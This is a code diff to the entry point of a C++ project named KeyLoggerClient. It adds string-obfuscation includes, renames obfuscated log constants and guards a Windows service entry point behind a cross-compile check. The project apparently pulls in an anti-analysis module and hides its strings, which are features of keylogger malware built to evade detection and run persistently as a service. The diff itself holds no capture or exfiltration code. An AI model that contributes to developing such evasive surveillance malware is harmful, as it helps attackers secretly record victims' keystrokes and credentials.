@@ -1,8 +1,12 @@
-// src/main.cpp
+// KeyLoggerClient/src/main.cpp (updated)
 #include "core/Application.h"
 #include "core/Logger.h"
 #include "security/AntiAnalysis.h"
 #include "utils/SystemUtils.h"
+#include "obfuscate.h"
+#include <vector>
+#include <cstdint>
+#include <string>
 
 // Obfuscated strings
 constexpr auto OBF_MAIN = OBFUSCATE("Main");
@@ -33,10 +37,10 @@ int main(int argc, char* argv[]) {
     try {
         Application app;
         if (app.Initialize()) {
-            LOG_INFO(OBFUSCATED_STARTUP_SUCCESS);
+            LOG_INFO(OBF_STARTUP_SUCCESS);
             app.Run();
         } else {
-            LOG_ERROR(OBFUSCATED_STARTUP_FAILED);
+            LOG_ERROR(OBF_STARTUP_FAILED);
             return 1;
         }
     }
@@ -49,11 +53,12 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    LOG_INFO(OBFUSCATED_SHUTDOWN);
+    LOG_INFO(OBF_SHUTDOWN);
     return 0;
 }
 
-// Service entry point
+// Service entry point (Windows only)
+#ifndef CROSS_COMPILE
 void ServiceMain(int argc, char* argv[]) {
     // Service initialization code would go here
     main(argc, argv);
@@ -71,3 +76,4 @@ void ServiceCtrlHandler(DWORD control) {
             break;
     }
 }
+#endif
